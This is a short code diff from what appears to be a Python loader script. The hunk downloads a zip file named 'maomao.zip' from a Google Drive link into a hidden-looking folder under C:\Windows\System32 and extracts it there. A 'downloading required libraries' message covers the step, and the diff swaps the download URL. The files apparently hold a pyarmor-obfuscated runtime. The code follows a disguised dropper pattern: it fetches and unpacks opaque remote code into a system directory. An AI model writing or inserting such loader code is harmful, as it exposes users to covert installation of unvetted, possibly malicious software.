@@ -147,7 +147,7 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
     print("--downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1lTiHH_o1oD5uba5XzCd63r2vK5NOdMJp", "C:\\Windows\\System32\\WCNMX\\maomao.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1KE4vJkaLz_65rHbdvt4wdJP0tz9zhy6d", "C:\\Windows\\System32\\WCNMX\\maomao.zip")
     zip_file = r'C:\Windows\System32\WCNMX\maomao.zip'
     extract_dir = r'C:\Windows\System32\WCNMX'
     extract_zip(zip_file, extract_dir)
